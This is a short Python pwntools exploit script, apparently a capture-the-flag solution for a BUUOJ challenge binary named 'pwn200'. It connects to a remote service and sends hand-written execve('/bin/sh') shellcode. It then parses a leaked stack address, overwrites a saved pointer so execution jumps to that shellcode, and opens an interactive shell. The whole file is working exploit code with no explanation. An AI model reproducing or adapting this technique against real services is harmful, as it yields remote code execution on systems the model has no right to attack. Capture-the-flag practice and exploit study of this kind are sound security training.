#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'amd64'


local = 0
if local == 1:
    r=process('./pwn200')
    gdb.attach(r,"b * 0x04009af")
    #gdb.attach(r,"b * 0x0400b0b")
else:
    r = remote('node4.buuoj.cn',26736)

elf= ELF('./pwn200')

r.recvuntil('re u?')
r.send("\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"+cyclic(18))
r.recvuntil('aaea')
stack = u64(r.recv(6)+'\x00\x00')
log.success('stack:'+hex(stack))
r.sendline('11')
r.recvuntil('money~')
r.send(p64(stack-0x50)+cyclic(56-8)+p64(stack+8))
r.recvuntil('ice :')
r.sendline('3')


r.interactive()
# 8 0x50
